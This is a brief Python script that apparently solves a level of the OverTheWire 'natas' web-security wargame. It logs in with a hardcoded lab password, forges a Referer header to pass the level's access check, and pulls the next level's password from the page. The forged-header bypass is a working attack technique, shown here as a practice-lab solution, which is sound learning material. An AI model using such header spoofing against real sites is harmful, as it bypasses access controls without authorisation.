from bs4 import BeautifulSoup as bs
import requests
import re

u='natas4'
p='Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
h={'Referer':'http://natas5.natas.labs.overthewire.org/'}
l=f'http://{u}.natas.labs.overthewire.org/'
resp=requests.get(l,auth=(u, p),headers=h)
t=resp.text
print(re.findall(r'Access granted. The password for natas5 is (.*)',t)[0])
